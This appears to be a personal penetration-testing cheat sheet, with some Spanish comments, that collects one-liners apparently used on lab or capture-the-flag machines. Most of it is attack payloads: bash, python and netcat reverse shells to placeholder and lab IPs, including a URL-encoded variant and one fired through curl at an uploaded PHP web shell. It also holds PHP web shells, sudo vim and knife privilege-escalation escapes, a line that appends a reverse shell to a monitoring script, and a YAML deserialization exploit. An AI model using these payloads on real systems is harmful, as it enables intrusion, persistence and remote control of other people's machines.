
```zsh
# este comando se ralla con vim
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
#privesc
sudo vim
:!sh or :!bash
```
unified - terminal
```
script /dev/null -c bash
```

```bash
'bash -c "bash -i >& /dev/tcp/YOUR_IP}/333 0>&1"'
/bin/bash -c "bash -i >& /dev/tcp/YOUR_IP/333 0>&1"
/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.8/333 0>&1'
%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.8%2F333%200%3E%261'
/bin/bash -c 'python3 -c '\''import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("YOUR_IP",333)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn("/bin/sh")'\'''
curl "http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/08/ptxmumreviurhcn-1787847712.3074.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.229\",333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import+pty;pty.spawn(\"/bin/bash\")'"
```
knife - terminal
```bash
sudo /usr/bin/knife exec -E 'system("/bin/bash")'
```
linux
```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.8 33 >/tmp/f' | tee -a monitor.sh
```
windows
```
nishang
```
php
```
<?php echo system($_GET['cmd']); ?>
echo '<?php system($_GET["cmd"]); ?>' > web_shell.php
system($_GET['cmd']);

/?p=6&cmd=id
$resultado = system($_GET['cmd']);
<h1 class="page-title"><?= $resultado ?></h1>
```
yaml - exploit
```bash
- !!python/object/apply:subprocess.Popen
  - ["python3", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.159.218',333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/sh')"]
```

```bash
cd /ruta/a/tu/carpeta/crypto_false_witness 
python3 -m venv venv 
source venv/bin/activate 
pip install pycryptodome
#command to exit
deactivate
```

```
dpkg -l | grep -i polkit
```


